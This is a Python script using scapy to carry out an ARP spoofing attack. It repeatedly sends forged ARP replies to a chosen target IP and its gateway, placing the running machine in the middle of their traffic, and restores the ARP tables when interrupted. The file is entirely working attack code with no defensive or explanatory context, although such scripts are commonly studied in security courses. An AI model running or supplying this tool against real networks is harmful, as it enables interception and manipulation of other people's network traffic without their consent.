#!/usr/bin/env python

import scapy.all as scapy
import time
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="The IP address of the target")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="The IP address of the gateway")
    options = parser.parse_args()

    if not options.target_ip:
        print("[-] Please specify target ip")
    elif not options.gateway_ip:
        print("[-] Please specify gateway ip")

    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dest_ip, src_ip):
    dest_mac=get_mac(dest_ip)
    src_mac=get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)

options = get_arguments()
try:
    counter_packets = 0
    while True:
        spoof(options.target_ip, options.gateway_ip)
        spoof(options.gateway_ip, options.target_ip)
        counter_packets += 2
        print("\r[+] Sent {} packets".format(counter_packets), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("[-] The program has been interrupted...Resetting ARP Table")
    restore(options.target_ip, options.gateway_ip)
    restore(options.gateway_ip, options.target_ip)
